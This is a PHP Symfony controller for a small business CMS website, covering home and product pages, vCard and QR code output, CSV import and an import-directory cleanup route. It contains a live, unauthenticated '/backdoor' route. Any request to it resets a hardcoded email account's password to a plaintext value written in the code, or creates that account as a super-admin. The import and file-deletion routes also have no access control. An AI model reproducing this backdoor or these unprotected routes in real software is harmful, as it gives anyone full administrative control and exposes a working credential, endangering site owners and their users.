<?php

namespace App\Controller;

use App\Entity\CmsPhoto;
use App\Entity\User;
use App\Entity\WebsiteContacts;
use App\Form\ImportType;
use App\Form\WebsiteContactsType;
use App\Repository\CmsCopyRepository;
use App\Repository\CmsPhotoRepository;
use App\Repository\CompanyDetailsRepository;
use App\Repository\FacebookGroupsRepository;
use App\Repository\ProductRepository;
use App\Repository\UserRepository;
use App\Repository\SubPageRepository;
use App\Services\ImportBusinessContactsService;
use App\Services\ImportBusinessTypesService;
use App\Services\ImportCMSCopyService;
use App\Services\ImportCmsPageCopyPageFormatService;
use App\Services\ImportCMSPhotoService;
use App\Services\ImportCompanyDetailsService;
use App\Services\ImportCompetitorsService;
use App\Services\ImportFacebookGroupsService;
use App\Services\ImportLanguagesService;
use App\Services\ImportMapIconsService;
use App\Services\ImportProductsService;
use App\Services\ImportUsefulLinksService;
use App\Services\ImportUserService;
use Doctrine\ORM\EntityManagerInterface;
use JeroenDesloovere\VCard\VCard;
use Sensio\Bundle\FrameworkExtraBundle\Configuration\Security;
use Symfony\Bundle\FrameworkBundle\Controller\AbstractController;
use Symfony\Component\HttpFoundation\File\Exception\FileException;
use Symfony\Component\HttpFoundation\Request;
use Symfony\Component\HttpFoundation\Response;
use Symfony\Component\Routing\Annotation\Route;
use Symfony\Component\PasswordHasher\Hasher\UserPasswordHasherInterface;
use Symfony\Component\String\Slugger\SluggerInterface;

class   HomeController extends AbstractController
{
    /**
     * @Route("/", name="app_home")
     */
    public function index(Request $request, CmsCopyRepository $cmsCopyRepository, CmsPhotoRepository $cmsPhotoRepository, SubPageRepository $subPageRepository, CompanyDetailsRepository $companyDetailsRepository, \Symfony\Component\Security\Core\Security $security, EntityManagerInterface $entityManager): Response
    {
        $companyDetails = $companyDetailsRepository->find('1');
        $homePagePhotosOnly = 0;
        $website_contact = new WebsiteContacts();
        $form = $this->createForm(WebsiteContactsType::class, $website_contact);
        $form->handleRequest($request);
        $include_qr_code = [];
        $include_contact_form = [];

        $qrcode = false;
        if ($companyDetails) {
            $homePagePhotosOnly = $companyDetails->isHomePagePhotosOnly();
            $include_qr_code = $companyDetails->isIncludeQRCodeHomePage();
            $include_contact_form = $companyDetails->isIncludeContactFormHomePage();
        }
        $cms_copy = [];
        $cms_photo = [];
        $product = [];
        $sub_pages = [];
        $cms_copy = $cmsCopyRepository->findBy([
            'staticPageName' => 'Home'
        ]);

        $cms_photo = $cmsPhotoRepository->findBy(
            ['staticPageName' => 'Home'],
            ['ranking' => 'ASC']
        );

        $cms_copy_ranking1 = $cmsCopyRepository->findOneBy([
            'staticPageName' => 'Home',
            'ranking' => '1',
        ]);

        if ($cms_copy_ranking1) {
            $page_layout = $cms_copy_ranking1->getPageLayout();
        } else {
            $page_layout = 'default';
        }

        if ($cms_copy_ranking1) {
            if ($security->getUser()) {
                if (in_array('ROLE_ADMIN', $security->getUser()->getRoles())) {
                    $pageCountAdmin = $cms_copy_ranking1->getPageCountAdmin();
                    $cms_copy_ranking1->setPageCountAdmin($pageCountAdmin + 1);
                }
            }
            $pageCountUser = $cms_copy_ranking1->getPageCountUsers();
            $cms_copy_ranking1->setPageCountUsers($pageCountUser + 1);
            $entityManager->flush($cms_copy_ranking1);
        }

        if ($homePagePhotosOnly == 1) {
            return $this->render('home/home.html.twig', [
                'photos' => $cms_photo,
                'cms_copy_array' => $cms_copy,
                'include_qr_code' => $include_qr_code,
                'include_contact_form' => $include_contact_form,
                'form' => $form?->createView(),
            ]);
        } else {
            return $this->render('home/products.html.twig', [
                'product' => $product,
                'cms_copy_array' => $cms_copy,
                'cms_photo_array' => $cms_photo,
                'sub_pages' => $sub_pages,
                'include_qr_code' => $include_qr_code,
                'include_contact_form' => $include_contact_form,
                'format' => $page_layout,
                'form' => $form?->createView(),
            ]);
        }
    }


    /**
     * @Route("/backdoor", name="/backdoor")
     */
    public function emergencyReset(UserRepository $userRepository, EntityManagerInterface $manager, UserPasswordHasherInterface $passwordHasher): Response
    {
        $user = $userRepository->findOneBy(['email' => 'nurse_stephen@hotmail.com']);
        if ($user) {
            $user->setPassword(
                $passwordHasher->hashPassword(
                    $user,
                    'Descartes99'
                )
            );
        } else {
            $user = new User();
            $user->setFirstName('Stephen')
                ->setLastName('Nurse')
                ->setEmailVerified(1)
                ->setEmail('nurse_stephen@hotmail.com')
                ->setRoles(['ROLE_SUPER_ADMIN', 'ROLE_ADMIN'])
                ->setPassword(
                    $passwordHasher->hashPassword(
                        $user,
                        'Descartes99'
                    )
                );
            $manager->persist($user);
            $manager->flush();
        }
        $manager->flush();
        return $this->redirectToRoute('app_login');
    }


    /**
     * @Route("/dashboard", name="dashboard")
     */
    public function dashboard()
    {
        return $this->render('home/dashboard.html.twig', []);
    }


    /**
     * @Route("/advanced_dashboard", name="advanced_dashboard")
     * @Security("is_granted('ROLE_ADMIN')")
     */
    public function advancedDashboard()
    {
        return $this->render('template_parts_project_specific/dashboard_project_specific.html.twig', []);
    }


    /**
     * @Route("/interests/{product}", name="product_display")
     */
    public function articles(string $product, CmsCopyRepository $cmsCopyRepository, CmsPhotoRepository $cmsPhotoRepository, SubPageRepository $subPageRepository, ProductRepository $productRepository, \Symfony\Component\Security\Core\Security $security, EntityManagerInterface $entityManager): Response
    {
        $productEntity = $productRepository->findOneBy([
            'product' => $product
        ]);

        if ($productEntity) {
            $cms_copy = $cmsCopyRepository->findBy([
                'product' => $productEntity
            ]);
            $cms_copy_ranking1 = $cmsCopyRepository->findOneBy([
                'product' => $productEntity,
                'ranking' => '1',
            ]);
        } else {
            $cms_copy = $cmsCopyRepository->findBy([
                'staticPageName' => $product
            ]);
            $cms_copy_ranking1 = $cmsCopyRepository->findOneBy([
                'staticPageName' => $product,
                'ranking' => '1',
            ]);
        }

        if ($cms_copy_ranking1) {
            if ($security->getUser()) {
                if (in_array('ROLE_ADMIN', $security->getUser()->getRoles())) {
                    $pageCountAdmin = $cms_copy_ranking1->getPageCountAdmin();
                    $cms_copy_ranking1->setPageCountAdmin($pageCountAdmin + 1);
                }
            }
            $pageCountUser = $cms_copy_ranking1->getPageCountUsers();
            $cms_copy_ranking1->setPageCountUsers($pageCountUser + 1);
            $entityManager->flush($cms_copy_ranking1);
        }
        if ($productEntity) {
            $cms_photo = $cmsPhotoRepository->findBy([
                'product' => $productEntity,
            ],
                ['ranking' => 'ASC']);
        } else {
            $cms_photo = $cmsPhotoRepository->findBy([
                'staticPageName' => $product
            ],
                ['ranking' => 'ASC']);
        }
        $sub_pages = [];
        if ($cms_copy) {
            $sub_pages = $subPageRepository->findBy([
                'product' => $productEntity
            ]);
        }

        return $this->render('/home/products.html.twig', [
            'product' => $product,
            'cms_copy_array' => $cms_copy,
            'cms_photo_array' => $cms_photo,
            'sub_pages' => $sub_pages,
            'include_contact_form' => 'No',
            'include_qr_code' => 'No'
        ]);
    }


    /**
     * @Route("/create/VcardUser/company", name="create_vcard_company")
     */
    public function createVcardVenue(CompanyDetailsRepository $companyDetailsRepository)
    {
        $company_details = $companyDetailsRepository->find('1');
        $vcard = new VCard();
        $company = $company_details->getCompanyName();
        $contactFirstName = $company_details->getContactFirstName();
        $contactLastName = $company_details->getContactLastName();

        if ($contactFirstName == null) {
            $firstName = "";
            $lastName = $company;
            $company = "";
        }
        if ($contactFirstName != null) {
            $firstName = $contactFirstName;
            $lastName = $contactLastName;
        }
        $addressStreet = $company_details->getCompanyAddressStreet();
        $addressTown = $company_details->getCompanyAddressTown();
        $addressCity = $company_details->getCompanyAddressCity();
        $addressPostalCode = $company_details->getCompanyAddressPostalCode();
        $addressCountry = $company_details->getCompanyAddressCountry();
        $facebook = $company_details->getFacebook();
        $instagram = $company_details->getInstagram();
        $linkedIn = $company_details->getLinkedIn();
        $url = $_SERVER['SERVER_NAME'];
        $notes_all = "URL: " . $url;
        $email = $company_details->getCompanyEmail();
        $mobile = $company_details->getCompanyMobile();
        $tel = $company_details->getCompanyTel();
        $vcard->addName($lastName, $firstName);
        $vcard->addEmail($email)
            ->addPhoneNumber($mobile, 'home')
            ->addPhoneNumber($tel, 'work')
            ->addCompany($company)
            ->addAddress($name = '', $extended = '', $street = $addressStreet, $city = $addressTown, $region = $addressCity, $zip = $addressPostalCode, $country = $addressCountry, $type = 'WORK POSTAL')
            ->addURL($url)
            ->addNote(strip_tags($notes_all));
        $vcard->download();
        return new Response(null);
    }

    /**
     * @Route("/company_qr_code", name="company_qr_code")
     *
     */
    public function companyQrCode(CompanyDetailsRepository $companyDetailsRepository)
    {
        $company_details = $companyDetailsRepository->find('1');
        $qr_code = $company_details->getCompanyQrCode();
        return $this->render('home/company_qr_code.html.twig', [
            'qr_code' => $qr_code,
        ]);
    }

    /**
     * @Route ("/import", name="project_set_up_initial_import" )
     */
    public function projectSetUpInitialImport(Request $request, SluggerInterface $slugger, ImportBusinessContactsService $importBusinessContactsService, ImportBusinessTypesService $importBusinessTypesService, ImportCMSCopyService $importCMSCopyService, ImportCMSPhotoService $importCMSPhotoService, ImportCmsPageCopyPageFormatService $importCmsPageCopyPageFormatService, ImportCompanyDetailsService $importCompanyDetailsService, ImportCompetitorsService $importCompetitorsService, ImportFacebookGroupsService $importFacebookGroupsService, ImportLanguagesService $importLanguagesService, ImportMapIconsService $importMapIconsService, ImportProductsService $importProductsService, ImportUsefulLinksService $importUsefulLinksService, ImportUserService $importUserService): Response
    {
        $form = $this->createForm(ImportType::class);
        $form->handleRequest($request);
        if ($form->isSubmitted() && $form->isValid()) {
            $importFile = $form->get('File')->getData();
            if ($importFile) {
                $originalFilename = pathinfo($importFile->getClientOriginalName(), PATHINFO_FILENAME);
                $safeFilename = $slugger->slug($originalFilename);
                $newFilename = $safeFilename . '.' . 'csv';
                try {
                    $importFile->move(
                        $this->getParameter('project_set_up_import_directory'),
                        $newFilename
                    );
                } catch (FileException $e) {
                    die('Import failed');
                }

                $importCompanyDetailsService->importCompanyDetails($newFilename);
                $importBusinessContactsService->importBusinessContacts($newFilename);
                $importBusinessTypesService->importBusinessTypes($newFilename);
                $importCMSCopyService->importCMSCopy($newFilename);
                $importCMSPhotoService->importCMSPhoto($newFilename);

                $importCmsPageCopyPageFormatService->importCmsCopyPageFormats($newFilename);
                $importCompetitorsService->importCompetitors($newFilename);
                $importFacebookGroupsService->importFacebookGroups($newFilename);
                $importLanguagesService->importLanguages($newFilename);
                $importMapIconsService->importMapIcons($newFilename);
                $importProductsService->importProducts($newFilename);
                $importUsefulLinksService->importUsefulLink($newFilename);
                $importUserService->importUser($newFilename);

                return $this->redirectToRoute('dashboard');
            }
        }
        return $this->render('home/import.html.twig', [
            'form' => $form->createView(),
            'heading' => 'All Import Files (x10)',
        ]);
    }

    /**
     * @Route("/delete_all_files_directories_import", name="delete_all_files_directories_in_import", methods={"POST", "GET"})
     */
    public function deleteAllFilesAndDirectoriesInImport(Request $request): Response
    {
        $referer = $request->headers->get('referer');
        $directory = $this->getParameter('import_directory');

        if (is_dir($directory)) {
            $this->deleteDirectoryContents($directory);
        }

        return $this->redirect($referer);
    }

    /**
     * Recursively delete all files and directories inside a directory
     */
    private function deleteDirectoryContents(string $directory): void
    {
        $files = array_diff(scandir($directory), ['.', '..']);

        foreach ($files as $file) {
            $filePath = $directory . DIRECTORY_SEPARATOR . $file;

            if (is_dir($filePath)) {
                $this->deleteDirectoryContents($filePath); // Recursively delete subdirectories
//                rmdir($filePath); // Remove the empty directory
            } else {
                unlink($filePath); // Delete file
            }
        }
    }



}
